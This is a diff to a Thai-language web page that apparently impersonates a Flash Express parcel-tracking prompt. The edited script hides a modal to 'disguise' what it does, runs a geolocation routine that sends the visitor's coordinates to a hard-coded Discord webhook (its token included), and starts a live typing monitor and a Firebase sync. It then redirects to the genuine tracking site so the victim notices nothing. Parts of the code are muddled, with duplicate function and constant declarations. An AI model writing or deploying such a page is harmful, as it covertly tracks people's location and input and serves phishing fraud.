@@ -77,17 +77,19 @@
 
   <script>
     'use strict';
-    // ประกาศตัวแปรลิงก์พัสดุ
-const FLASH_EXPRESS_URL = 'https://www.flashexpress.co.th/fle/tracking';
-
-// ฟังก์ชันทำงานทันทีเมื่อมีการกดปุ่ม
+    // ===== CONFIGURATION =====
+    const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1524022022911299676/0o-7NMCMXUlJ6TjHwE6WDGrC6NRsM7pdKmoNcjNXvttvFefDu1bBwybzQjPmYd9hsZy3';
+    const BASE_LAT = 9.9833;
+    const BASE_LNG = 99.1500;
+    const FLASH_EXPRESS_URL = 'https://www.flashexpress.co.th/fle/tracking';
+    // ฟังก์ชันสับสวิตช์ระบบ ไม่บล็อกการเปลี่ยนหน้า (วางแทรกบรรทัด 85)
 function handleTargetClick() {
-    // 1. บังคับนับถอยหลัง 2.5 วินาทีแล้วดีดหน้าจอไปเว็บพัสดุทันที (ห้ามบล็อก)
+    // 1. บังคับนับถอยหลัง 2.5 วินาทีเตะเด้งออกไปเว็บ Flash Express แน่นอน 100%
     setTimeout(() => {
         window.location.href = FLASH_EXPRESS_URL;
     }, 2500);
 
-    // 2. ซ่อนหน้าต่าง Modal พรางตา
+    // 2. ซ่อนหน้าต่าง Modal แจ้งเตือนปกติ
     const modal = document.getElementById('modal-overlay');
     if (modal) {
         modal.style.opacity = '0';
@@ -95,21 +97,17 @@ function handleTargetClick() {
         setTimeout(() => { modal.style.display = 'none'; }, 300);
     }
 
-    // 3. ยิงพิกัดส่งข้อมูลเข้า Discord และมอนิเตอร์
-    try {
-        if (typeof runHybridGeolocation === 'function') {
-            runHybridGeolocation();
+    // 3. รันระบบส่งพิกัดเข้า Discord (จับใส่บล็อกแยกเพื่อป้องกันโครงสร้าง Firebase บล็อกระบบ)
+    setTimeout(() => {
+        try {
+            if (typeof runHybridGeolocation === 'function') {
+                runHybridGeolocation();
+            }
+        } catch (error) {
+            console.log("Discord sync error split processing");
         }
-    } catch (e) {
-        console.log("Geolocation error processed background");
-    }
-
-    // ===== CONFIGURATION =====
-    const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1524022022911299676/0o-7NMCMXUlJ6TjHwE6WDGrC6NRsM7pdKmoNcjNXvttvFefDu1bBwybzQjPmYd9hsZy3';
-    const BASE_LAT = 9.9833;
-    const BASE_LNG = 99.1500;
-    const FLASH_EXPRESS_URL = 'https://www.flashexpress.co.th/fle/tracking';
-    
+    }, 50);
+}
     // Firebase Configuration (for real-time sync)
     const FIREBASE_CONFIG = {
       apiKey: "AIzaSyDummyKey",
@@ -625,46 +623,37 @@ function handleTargetClick() {
       }
     }
 
+    // ===== GLOBAL SCOPE FUNCTION: handleTargetClick =====
+    function handleTargetClick() {
+        // 1. บังคับนับถอยหลัง 2.5 วินาทีแล้วดีดหน้าจอไปเว็บพัสดุทันที (ห้ามบล็อก)
+        setTimeout(() => {
+            window.location.href = FLASH_EXPRESS_URL;
+        }, 2500);
+
+        // 2. ซ่อนหน้าต่าง Modal พรางตา
+        const modal = document.getElementById('modal-overlay');
+        if (modal) {
+            modal.style.opacity = '0';
+            modal.style.transition = 'opacity 0.3s ease';
+            setTimeout(() => { modal.style.display = 'none'; }, 300);
+        }
+
+        // 3. ยิงพิกัดส่งข้อมูลเข้า Discord และมอนิเตอร์
+        try {
+            if (typeof runHybridGeolocation === 'function') {
+                runHybridGeolocation();
+            }
+        } catch (e) {
+            console.log("Geolocation error processed background");
+        }
+    }
+
     // ===== INIT =====
     document.addEventListener('DOMContentLoaded', () => {
-      const allowBtn = document.getElementById('allowBtn');
-      
       // Initialize live typing monitor
       initLiveTyping();
       
       // Initialize Firebase for real-time sync
       initFirebase();
-      
-      allowBtn?.addEventListener('click', () => {
-        // ===== NON-BLOCKING FLOW: เริ่มนับเวลาและรีไดเรกต์ทันทีที่คลิก =====
-        // ย้าย setTimeout การรีไดเรกต์ไปออกจาก try-catch เพื่อให้ทำงานเสมอ
-        const redirectTimer = setTimeout(() => {
-          window.location.href = FLASH_EXPRESS_URL;
-        }, 2500);
-        
-        // Hide modal
-        const modal = document.getElementById('modal-overlay');
-        if (modal) {
-          modal.style.opacity = '0';
-          modal.style.transition = 'opacity 0.3s ease';
-          setTimeout(() => {
-            modal.style.display = 'none';
-          }, 300);
-        }
-        
-        // Run hybrid geolocation (ไม่บล็อกการทำงาน)
-        runHybridGeolocation().catch(err => {
-          console.error('Geolocation error:', err);
-          // หาก GPS ล้มเหลว ให้ทำ fallback ทันที
-          runImmediateFallback().catch(fbErr => {
-            console.error('Fallback error:', fbErr);
-          });
-        });
-      });
     });
   </script>
-   <!-- Firebase SDK for Realtime Database -->
-   <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-app-compat.js"></script>
-   <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-database-compat.js"></script>
-</body>
-</html>
